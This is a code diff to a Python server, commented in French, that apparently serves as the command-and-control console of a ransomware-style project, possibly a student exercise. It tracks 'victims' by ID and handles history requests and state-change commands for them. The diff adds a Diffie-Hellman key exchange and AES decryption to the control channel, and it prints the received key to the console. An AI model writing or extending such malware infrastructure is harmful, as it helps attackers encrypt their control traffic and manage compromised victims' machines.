@@ -5,6 +5,7 @@ import utile.message as message
 import utile.data as data
 import random
 import string
+import utile.security as security
 
 
 def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
@@ -29,7 +30,10 @@ def main():
     print("En attente de messages...")
     while True:
         client_socket, address = socket_server.accept()
-        message_console = network.receive_message(client_socket)
+        key = security.diffie_hellman_recv_key(client_socket)
+        print(f"Clé de chiffrement reçue : {key}")
+        encrypted_message_console = network.receive_message(client_socket)
+        message_console = security.aes_decrypt(encrypted_message_console, key)
         # Si aucun message n'est reçu, fermer la connexion avec ce client et attendre le suivant
         if message_console is None:
             print("Aucun message reçu, connexion fermée.")
@@ -58,9 +62,11 @@ def main():
                     print("Message envoyé")
         # Traiter le message reçu de type HIST_REQ
         elif type_message == "HIST_REQ":
+            #Decryptage de encrypted_id
+            encrypted_id = network.receive_message(client_socket)
+            victim_id = security.aes_decrypt(encrypted_id, key)
             # Récupérer l'historique en fonction de l'id de la victime
-            victim = network.receive_message(client_socket)
-            history = data.get_list_history(conn, victim)
+            history = data.get_list_history(conn, victim_id)
             # Envoi de la réponse de type HISTORY_RESP (pour chaque élément de l'historique)
             for i in range(len(history)):
                 message_response = message.set_message("HISTORY_RESP", history[i])
@@ -75,8 +81,10 @@ def main():
                     print("Message envoyé")
         # Traiter le message reçu de type CHGSTATE
         elif type_message == "CHGSTATE":
+            #Decryptage de l'id de la victime
+            encrypted_id = network.receive_message(client_socket)
+            victim_id = security.aes_decrypt(encrypted_id, key)
             # récupérer l'état actuel en fonction de l'id de la victime
-            victim_id = network.receive_message(client_socket)
             history = data.get_list_history(conn, victim_id)
             if len(history) > 0:
                 # Récupérer le dernier état de la victime
